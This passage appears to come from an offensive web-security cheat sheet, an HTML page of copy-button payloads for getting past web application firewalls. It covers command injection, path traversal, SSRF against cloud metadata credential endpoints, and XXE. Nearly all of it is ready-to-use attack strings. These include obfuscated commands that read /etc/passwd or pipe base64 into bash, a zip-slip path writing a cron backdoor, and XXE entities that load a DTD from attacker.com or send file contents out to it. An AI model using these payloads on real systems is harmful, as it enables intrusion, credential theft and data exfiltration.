+<span class="cmd-line">&lt;img
+src=x
+onerror=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Slash in tag &mdash; Slash as attribute separator</span>
+<span class="cmd-line">&lt;img/src=x/onerror=alert(1)&gt;</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s7" data-cat="s7">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#9888;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#00d4ff">COMMAND INJECTION WAF BYPASS</div>
+      <div class="sec-desc">OS command injection bypass techniques for applications that pass input to shell commands.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#00d4ff">Command Separators</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Semicolon &mdash; Standard command separator</span>
+<span class="cmd-line">; id</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Pipe &mdash; Pipe output to next command</span>
+<span class="cmd-line">| id</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// AND &mdash; Execute if previous succeeded</span>
+<span class="cmd-line">&amp;&amp; id</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// OR &mdash; Execute if previous failed</span>
+<span class="cmd-line">|| id</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Backtick &mdash; Command substitution (older bash)</span>
+<span class="cmd-line">`id`</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Dollar parens &mdash; Command substitution (modern bash)</span>
+<span class="cmd-line">$(id)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Newline &mdash; Newline as command separator</span>
+<span class="cmd-line">%0a id</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Null byte &mdash; Null byte + semicolon</span>
+<span class="cmd-line">%00; id</span>
+</div><div class="group-label" style="color:#00d4ff">Keyword Bypass Techniques</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Quote insertion &mdash; Single quotes split but ignored by shell</span>
+<span class="cmd-line">c'a't /etc/passwd  w'h'o'a'm'i</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Double quotes &mdash; Double quotes also ignored by shell</span>
+<span class="cmd-line">c"a"t /etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Backslash &mdash; Backslash line continuation ignored</span>
+<span class="cmd-line">c\at /etc/passwd  wh\oami</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Variable expansion &mdash; $IFS = internal field separator (space/tab)</span>
+<span class="cmd-line">$IFS$9cat$IFS/etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Brace expansion &mdash; Bash brace expansion without spaces</span>
+<span class="cmd-line">{cat,/etc/passwd}</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Base64 decode &mdash; Execute base64-encoded command</span>
+<span class="cmd-line">$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Hex decode &mdash; printf hex then execute</span>
+<span class="cmd-line">$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Environment vars &mdash; Reference env vars for path</span>
+<span class="cmd-line">$PATH — use known binaries</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Wildcards &mdash; ? wildcard matches single char</span>
+<span class="cmd-line">/???/c?t /etc/p?sswd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Glob patterns &mdash; Character class glob</span>
+<span class="cmd-line">/bin/c[a]t /etc/passwd</span>
+</div><div class="group-label" style="color:#00d4ff">Linux Specific</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// IFS bypass &mdash; IFS as space replacement</span>
+<span class="cmd-line">cat$IFS/etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Redirect input &mdash; Input redirect without space</span>
+<span class="cmd-line">cat&lt;/etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Here string &mdash; Here string as input</span>
+<span class="cmd-line">cat&lt;&lt;&lt;$(id)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Readonly IFS &mdash; Custom IFS with whitespace chars</span>
+<span class="cmd-line">X=$'\t\n\r';IFS=$X;cat${IFS}/etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// env command &mdash; Prefix with env command</span>
+<span class="cmd-line">env id  env cat /etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Shell expansion &mdash; Substring expansion for /</span>
+<span class="cmd-line">${HOME:0:1}  /bin${HOME:0:1}sh</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// History expansion &mdash; Bash history expansion</span>
+<span class="cmd-line">!cat  !! (repeat last)</span>
+</div><div class="group-label" style="color:#00d4ff">Windows Specific</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CMD separator &mdash; Windows command separators</span>
+<span class="cmd-line">&amp; whoami  | whoami  || whoami</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Caret escape &mdash; Caret ^ is escape char in CMD (ignored)</span>
+<span class="cmd-line">w^h^o^a^m^i</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Percent expansion &mdash; Use env vars to hide keywords</span>
+<span class="cmd-line">%ComSpec% /c whoami</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// PowerShell bypass &mdash; Caret in PowerShell command name</span>
+<span class="cmd-line">pow^ers^hell -c whoami</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Env var split &mdash; Split command across variables</span>
+<span class="cmd-line">set X=whoami &amp;&amp; call %X%</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00d4ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Alternatedata stream &mdash; NTFS alternate data stream</span>
+<span class="cmd-line">cmd.exe /c more &lt; file.txt:hidden.txt</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s8" data-cat="s8">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128193;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#00ff88">PATH TRAVERSAL WAF BYPASS</div>
+      <div class="sec-desc">Bypass WAF rules on directory traversal using encoding, case variation, and path normalization tricks.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#00ff88">Basic Traversal Variants</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Basic &mdash; Often blocked outright</span>
+<span class="cmd-line">../../../etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// URL encoded &mdash; Single URL encode /</span>
+<span class="cmd-line">..%2F..%2F..%2Fetc%2Fpasswd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Double URL encoded &mdash; Double encode — %2F -&gt; %252F</span>
+<span class="cmd-line">..%252F..%252F..%252Fetc%252Fpasswd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed encode &mdash; Mix raw / with encoded %2f</span>
+<span class="cmd-line">..%2f../..%2fetc%2fpasswd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Backslash &mdash; Windows path separator</span>
+<span class="cmd-line">..\..\..\etc\passwd  ..\..\../etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Encoded backslash &mdash; %5C = URL encoded backslash</span>
+<span class="cmd-line">..%5C..%5C..%5Cetc%5Cpasswd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Dot encode &mdash; %2e = URL encoded dot</span>
+<span class="cmd-line">%2e%2e/%2e%2e/%2e%2e/etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Double dot encode &mdash; All chars encoded</span>
+<span class="cmd-line">%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</span>
+</div><div class="group-label" style="color:#00ff88">Normalization Bypass</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Extra dots &mdash; Four dots + // — reduces to ../</span>
+<span class="cmd-line">....//....//....//etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Repeated slashes &mdash; Extra slashes normalized away</span>
+<span class="cmd-line">..///../..///../etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed slashes &mdash; Mixed path separators</span>
+<span class="cmd-line">../\../\../etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Null byte &mdash; Null byte truncates extension check</span>
+<span class="cmd-line">../../../etc/passwd%00.jpg</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Unicode dots &mdash; %c0%af = overlong UTF-8 /</span>
+<span class="cmd-line">..%c0%af..%c0%afetc%c0%afpasswd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// UTF-16 slash &mdash; %u2215 = Unicode division slash</span>
+<span class="cmd-line">..%u2215..%u2215etc%u2215passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Absolute path &mdash; Direct absolute path</span>
+<span class="cmd-line">/etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// URL scheme &mdash; Protocol-based path</span>
+<span class="cmd-line">file:///etc/passwd</span>
+</div><div class="group-label" style="color:#00ff88">Context-Specific Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// With prefix strip &mdash; Bypass that strips only once</span>
+<span class="cmd-line">....//....//etc/passwd  (if app strips ../)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// PHP filters &mdash; PHP wrapper bypass</span>
+<span class="cmd-line">php://filter/convert.base64-encode/resource=../../../etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Zip slip &mdash; Archive path traversal</span>
+<span class="cmd-line">../../../etc/cron.d/backdoor (in zip filename)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#00ff88">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Case on Windows &mdash; Windows case-insensitive paths</span>
+<span class="cmd-line">../../../WINDOWS/win.ini  ..\..\..\..\ </span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s9" data-cat="s9">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#127760;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#b060ff">SSRF WAF BYPASS</div>
+      <div class="sec-desc">Server-side request forgery bypass techniques to access internal networks and cloud metadata endpoints.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#b060ff">IP Address Encoding</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Decimal IP &mdash; Decimal representation of 127.0.0.1</span>
+<span class="cmd-line">http://2130706433/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Octal IP &mdash; Octal representation</span>
+<span class="cmd-line">http://0177.0.0.1/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Hex IP &mdash; Hex representation of 127.0.0.1</span>
+<span class="cmd-line">http://0x7f000001/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// IPv6 loopback &mdash; IPv6 localhost</span>
+<span class="cmd-line">http://[::1]/  http://[::ffff:127.0.0.1]/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// IPv6 mapped &mdash; IPv6 mapped IPv4</span>
+<span class="cmd-line">http://[::ffff:7f00:1]/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed notation &mdash; Mixed decimal/hex octets</span>
+<span class="cmd-line">http://127.0.0.0x1/  http://0x7f.0.0.1/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// URL encoding &mdash; URL-encoded dots in IP</span>
+<span class="cmd-line">http://127%2e0%2e0%2e1/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Unicode dots &mdash; Unicode fullwidth period</span>
+<span class="cmd-line">http://127。0。0。1/</span>
+</div><div class="group-label" style="color:#b060ff">URL Bypass Techniques</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Open redirect chain &mdash; Use app's open redirect to reach internal</span>
+<span class="cmd-line">/redirect?url=http://169.254.169.254/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Subdomain bypass &mdash; DNS points to metadata IP</span>
+<span class="cmd-line">http://169.254.169.254.attacker.com/ → points to 169.254.169.254</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// DNS rebinding &mdash; Rebinding service for bypass</span>
+<span class="cmd-line">http://1u.ms/169.254.169.254/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// URL fragment &mdash; Fragment may be stripped</span>
+<span class="cmd-line">http://attacker.com/ssrf#http://169.254.169.254/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Credentials in URL &mdash; @ separates credentials</span>
+<span class="cmd-line">http://attacker@169.254.169.254/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// URL path bypass &mdash; # in URL confuses parser</span>
+<span class="cmd-line">http://169.254.169.254%23.attacker.com/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// CRLF in URL &mdash; CRLF injection in redirect</span>
+<span class="cmd-line">http://169.254.169.254/%0d%0aHost: attacker.com</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Whitespace in URL &mdash; Space in URL — some parsers strip it</span>
+<span class="cmd-line">http:// 169.254.169.254/</span>
+</div><div class="group-label" style="color:#b060ff">Protocol Schemes</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// file:// protocol &mdash; Read local files</span>
+<span class="cmd-line">file:///etc/passwd</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// dict:// protocol &mdash; Redis via dict protocol</span>
+<span class="cmd-line">dict://127.0.0.1:6379/info</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// gopher:// protocol &mdash; Redis/SMTP via gopher</span>
+<span class="cmd-line">gopher://127.0.0.1:6379/_INFO%0D%0A</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ftp:// protocol &mdash; FTP internal service</span>
+<span class="cmd-line">ftp://127.0.0.1:21/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// sftp:// protocol &mdash; SFTP callback</span>
+<span class="cmd-line">sftp://attacker.com:11111/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ldap:// protocol &mdash; LDAP internal access</span>
+<span class="cmd-line">ldap://127.0.0.1:389/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// tftp:// protocol &mdash; TFTP — UDP based</span>
+<span class="cmd-line">tftp://attacker.com/file</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// jar:// scheme &mdash; Java JAR protocol</span>
+<span class="cmd-line">jar:http://attacker.com/evil.jar!/</span>
+</div><div class="group-label" style="color:#b060ff">Cloud Metadata Endpoints</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// AWS standard &mdash; AWS instance metadata</span>
+<span class="cmd-line">http://169.254.169.254/latest/meta-data/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// AWS IMDSv2 &mdash; AWS IAM role credentials</span>
+<span class="cmd-line">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// AWS via IPv6 &mdash; AWS IPv6 metadata endpoint</span>
+<span class="cmd-line">http://[fd00:ec2::254]/latest/meta-data/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// GCP standard &mdash; GCP metadata (requires header)</span>
+<span class="cmd-line">http://metadata.google.internal/computeMetadata/v1/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// GCP IP direct &mdash; GCP via standard IP</span>
+<span class="cmd-line">http://169.254.169.254/computeMetadata/v1/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Azure &mdash; Azure IMDS</span>
+<span class="cmd-line">http://169.254.169.254/metadata/instance?api-version=2021-02-01</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// DigitalOcean &mdash; DO metadata</span>
+<span class="cmd-line">http://169.254.169.254/metadata/v1/</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Oracle Cloud &mdash; Oracle Cloud metadata</span>
+<span class="cmd-line">http://169.254.169.254/opc/v1/instance/</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s10" data-cat="s10">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128196;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#ff3c78">XXE WAF BYPASS</div>
+      <div class="sec-desc">XML External Entity bypass techniques when WAFs block standard XXE payloads.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#ff3c78">Encoding Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// UTF-16 encoding &mdash; Switch to UTF-16 encoding</span>
+<span class="cmd-line">&lt;?xml version='1.0' encoding='UTF-16'?&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// UTF-7 encoding &mdash; UTF-7 may bypass UTF-8 rule</span>
+<span class="cmd-line">&lt;?xml version='1.0' encoding='UTF-7'?&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// IBM EBCDIC &mdash; EBCDIC encoding bypass</span>
+<span class="cmd-line">&lt;?xml version='1.0' encoding='IBM037'?&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ASCII encoding &mdash; Explicit ASCII declaration</span>
+<span class="cmd-line">&lt;?xml version='1.0' encoding='US-ASCII'?&gt;</span>
+</div><div class="group-label" style="color:#ff3c78">Entity Type Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Parameter entities &mdash; Use parameter (%) instead of general entities</span>
+<span class="cmd-line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'&gt;%xxe;]&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Nested parameter &mdash; Nested parameter entity</span>
+<span class="cmd-line">&lt;!DOCTYPE foo [&lt;!ENTITY % a '&lt;!ENTITY b SYSTEM "http://attacker.com/"&gt;'&gt;%a;]&gt;&amp;b;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// DTD via parameter &mdash; Split payload to bypass inline rule</span>
+<span class="cmd-line">External DTD hosts the actual payload, inline just loads it</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Error-based XXE &mdash; Error message leaks file content</span>
+<span class="cmd-line">&lt;!DOCTYPE foo [&lt;!ENTITY % a SYSTEM 'file:///etc/passwd'&gt;&lt;!ENTITY % b '&lt;!ENTITY c SYSTEM "file://%a"&gt;'&gt;%b;]&gt;&amp;c;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Blind OOB XXE &mdash; Out-of-band data exfiltration</span>
+<span class="cmd-line">&lt;!ENTITY % file SYSTEM 'file:///etc/passwd'&gt;&lt;!ENTITY % exfil '&lt;!ENTITY send SYSTEM "http://attacker.com/?x=%file;"&gt;'&gt;</span>
+</div><div class="group-label" style="color:#ff3c78">WAF Evasion Variations</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Whitespace in DOCTYPE &mdash; Newlines in DOCTYPE</span>
+<span class="cmd-line">&lt;!DOCTYPE
+foo
+[</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Tab in entity &mdash; Tabs in entity definition</span>
+<span class="cmd-line">&lt;!ENTITY	xxe	SYSTEM	'file:///etc/passwd'&gt;</span>
